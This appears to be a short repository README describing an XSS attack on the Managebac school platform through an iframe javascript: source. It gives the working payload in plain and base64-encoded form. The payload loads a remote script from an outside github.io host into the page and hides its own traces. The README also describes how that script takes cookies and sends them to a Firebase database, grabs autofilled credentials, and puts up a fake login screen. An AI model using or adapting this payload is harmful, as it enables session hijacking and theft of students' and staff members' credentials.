# Managebac XSS attack
Managebac is a very secure systen, however it has a vulnerability allowing XSS attacks using iframe src, ```<iframe src="javascript:{codehere}"><iframe>```, this enables an attacker to execute code in discussion forums or similiar to steal user credentials

# Payload used
The payload I used for this repo is:
```
<iframe id="discussion-payload-iframe" src="javascript:eval(atob(`{base64encodedhere}`));"></iframe> 
```
with the executed payload (which is in base64 for various reasons) being 
```
let a = document.createElement('script'); a.type = "module"; a.src = 'https://existencing.github.io/xss/mb.js'; top.document.head.appendChild(a); document.getElementById("discussion-payload-iframe").remove(); let b = document.getElementById("discussion-payload-iframe"); let discussions = document.getElementsByClassName("discussion"); while (Object.values(discussions).indexOf(b) === -1) { b = b.parentNode;}; b.remove();
```
which in base 64 is
```
bGV0IGEgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTsgYS50eXBlID0gIm1vZHVsZSI7IGEuc3JjID0gJ2h0dHBzOi8vZXhpc3RlbmNpbmcuZ2l0aHViLmlvL3hzcy9tYi5qcyc7IHRvcC5kb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKGEpOyBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZGlzY3Vzc2lvbi1wYXlsb2FkLWlmcmFtZSIpLnJlbW92ZSgpOyBsZXQgYiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJkaXNjdXNzaW9uLXBheWxvYWQtaWZyYW1lIik7IGxldCBkaXNjdXNzaW9ucyA9IGRvY3VtZW50LmdldEVsZW1lbnRzQnlDbGFzc05hbWUoImRpc2N1c3Npb24iKTsgd2hpbGUgKE9iamVjdC52YWx1ZXMoZGlzY3Vzc2lvbnMpLmluZGV4T2YoYikgPT09IC0xKSB7IGIgPSBiLnBhcmVudE5vZGU7fTsgYi5yZW1vdmUoKTs=
```
# Functioning of code
1. Using XSS payload, inject a script into top frame of document (i.e target website)
2. Script grabs cookies of website and sends them to a Firebase DB
3. Script creates another frame which imitates login screen, if autofill credentials is enabled, then credentials are stolen and script self deletes
4. If credentials not stolen already, then a fake login screen is injected that tricks user to enter credentials, script self deletes